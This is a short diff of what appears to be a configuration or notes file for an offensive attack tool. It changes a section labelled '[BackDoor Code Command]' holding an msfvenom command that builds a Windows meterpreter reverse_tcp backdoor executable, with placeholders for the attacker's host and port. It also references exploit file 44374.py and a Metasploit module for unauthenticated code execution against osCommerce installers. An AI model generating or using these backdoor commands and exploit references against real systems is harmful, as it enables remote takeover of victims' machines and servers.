@@ -14,9 +14,8 @@ Read The Scan File
 1. Reference File : 44374.py
 2. Execution : configuraiton
 
-[Shell Code Gener]
-msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > backdoor.exe
-
+[BackDoor Code Command]
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > backdoor.exe
 
 [osCommerce]
 1. Attack Vector : multi/http/oscommerce_installer_unauth_code_exec
